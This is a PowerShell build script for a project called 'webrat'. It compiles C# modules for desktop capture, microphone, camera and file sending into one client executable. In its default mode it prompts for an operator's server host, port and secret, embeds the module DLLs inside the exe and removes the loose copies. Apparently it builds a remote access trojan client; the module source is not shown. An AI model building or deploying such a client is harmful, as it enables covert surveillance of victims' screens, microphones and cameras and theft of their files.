param(
  [string]$OutDir = "$PSScriptRoot\out",
  [string]$API_BASE_URL = "http://localhost:8080",
  [string]$STREAM_SECRET = "webrat-secret",
  [string]$Mode = "exe"
)

New-Item -ItemType Directory -Force -Path $OutDir | Out-Null
Push-Location $PSScriptRoot

function Find-Csc {
  $candidates = @(
    "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
    "$env:WINDIR\Microsoft.NET\Framework\v4.0.30319\csc.exe"
  )
  foreach ($p in $candidates) { if (Test-Path $p) { return $p } }
  return $null
}

$csc = Find-Csc
if (-not $csc) { Write-Error "csc.exe not found"; exit 1 }

$refs = @(
  "System.dll",
  "System.Core.dll",
  "System.Drawing.dll",
  "System.Net.Http.dll",
  "System.Net.WebSockets.dll",
  "System.Windows.Forms.dll"
)

$rArgs = $refs | ForEach-Object { "/r:$($_)" }

 $desktopSrc = (Resolve-Path ".\desktop\Desktop.cs")
 $micSrc = (Resolve-Path ".\microphone\Microphone.cs")
 $camSrc = (Resolve-Path ".\camera\Camera.cs")
$cryptoSrc = (Resolve-Path ".\common\Crypto.cs")
$sendSrc = (Resolve-Path ".\sendfile\Sendfile.cs")
 $clientSrc = (Resolve-Path ".\Client\Program.cs")
 $testCamSrc = (Resolve-Path ".\camera\TestCamera.cs")
 
 if ($Mode -eq "dll") {
   $BASE = $API_BASE_URL
   if ([string]::IsNullOrWhiteSpace($BASE)) { $BASE = "http://localhost:8080" }
   $SS = $STREAM_SECRET
   if ([string]::IsNullOrWhiteSpace($SS)) { $SS = "webrat-secret" }
   $confCode = @"
namespace WebratCs.BuildConf {
  public static class BuildDefaults {
    public const string API_BASE_URL = "$BASE";
    public const string STREAM_SECRET = "$SS";
  }
}
"@
   $confPath = Join-Path $OutDir "Config.Build.cs"
   Set-Content -Path $confPath -Value $confCode -Encoding UTF8
   & $csc /nologo /target:library /out:"$OutDir\common.dll" $rArgs `
     $cryptoSrc
  & $csc /nologo /target:library /out:"$OutDir\desktop.dll" $rArgs `
    "/r:$OutDir\common.dll" `
    $desktopSrc
  & $csc /nologo /target:library /out:"$OutDir\microphone.dll" $rArgs `
    "/r:$OutDir\common.dll" `
    $micSrc
  & $csc /nologo /target:library /out:"$OutDir\camera.dll" $rArgs `
    "/r:$OutDir\common.dll" `
    $camSrc
  & $csc /nologo /target:library /out:"$OutDir\sendfile.dll" $rArgs `
    "/r:$OutDir\common.dll" `
    $sendSrc
   & $csc /nologo /target:exe /out:"$OutDir\webrat-cs-client.exe" `
    "/r:$OutDir\desktop.dll" "/r:$OutDir\microphone.dll" "/r:$OutDir\camera.dll" "/r:$OutDir\sendfile.dll" "/r:$OutDir\common.dll" `
     $rArgs $clientSrc $confPath
 } elseif ($Mode -eq "testcam") {
   & $csc /nologo /target:exe /out:"$OutDir\test-camera.exe" `
    $rArgs `
    $testCamSrc $camSrc
 } else {
   $DEFAULT_SITE = "localhost"
   $DEFAULT_PORT = "8080"
   Write-Host "Enter API host [$DEFAULT_SITE]: " -ForegroundColor Cyan -NoNewline
   $SITE = Read-Host
   if ([string]::IsNullOrWhiteSpace($SITE)) { $SITE = $DEFAULT_SITE }
   Write-Host "Enter API port [$DEFAULT_PORT]: " -ForegroundColor Cyan -NoNewline
   $PORT = Read-Host
   if ([string]::IsNullOrWhiteSpace($PORT)) { $PORT = $DEFAULT_PORT }
   Write-Host "Enter STREAM_SECRET [webrat-secret]: " -ForegroundColor Cyan -NoNewline
   $SS = Read-Host
   if ([string]::IsNullOrWhiteSpace($SS)) { $SS = "webrat-secret" }
   $BASE = $API_BASE_URL
   if ([string]::IsNullOrWhiteSpace($BASE)) {
     if ($SITE.StartsWith("http://") -or $SITE.StartsWith("https://")) {
       $BASE = "$SITE"
     } else {
       $BASE = "http://$SITE`:$PORT"
     }
   }
   $confCode = @"
namespace WebratCs.BuildConf {
  public static class BuildDefaults {
    public const string API_BASE_URL = "$BASE";
    public const string STREAM_SECRET = "$SS";
  }
}
"@
   $confPath = Join-Path $OutDir "Config.Build.cs"
   Set-Content -Path $confPath -Value $confCode -Encoding UTF8
   & $csc /nologo /target:library /out:"$OutDir\common.dll" $rArgs `
     $cryptoSrc
  & $csc /nologo /target:library /out:"$OutDir\desktop.dll" $rArgs `
    "/r:$OutDir\common.dll" `
    $desktopSrc
  & $csc /nologo /target:library /out:"$OutDir\microphone.dll" $rArgs `
    "/r:$OutDir\common.dll" `
    $micSrc
  & $csc /nologo /target:library /out:"$OutDir\camera.dll" $rArgs `
    "/r:$OutDir\common.dll" `
    $camSrc
  & $csc /nologo /target:library /out:"$OutDir\sendfile.dll" $rArgs `
    "/r:$OutDir\common.dll" `
    $sendSrc
  & $csc /nologo /target:exe /out:"$OutDir\webrat-cs-client.exe" `
    "/r:$OutDir\desktop.dll" "/r:$OutDir\microphone.dll" "/r:$OutDir\camera.dll" "/r:$OutDir\sendfile.dll" "/r:$OutDir\common.dll" `
    "/resource:$OutDir\desktop.dll,WebratCsDeps.desktop.dll" "/resource:$OutDir\microphone.dll,WebratCsDeps.microphone.dll" "/resource:$OutDir\camera.dll,WebratCsDeps.camera.dll" "/resource:$OutDir\sendfile.dll,WebratCsDeps.sendfile.dll" "/resource:$OutDir\common.dll,WebratCsDeps.common.dll" `
    $rArgs $clientSrc $confPath
  Remove-Item -Force "$OutDir\desktop.dll","$OutDir\microphone.dll","$OutDir\camera.dll","$OutDir\sendfile.dll","$OutDir\common.dll"
 }

Write-Host "Built to $OutDir"
Write-Host "Run: `"$OutDir\webrat-cs-client.exe`""

Pop-Location
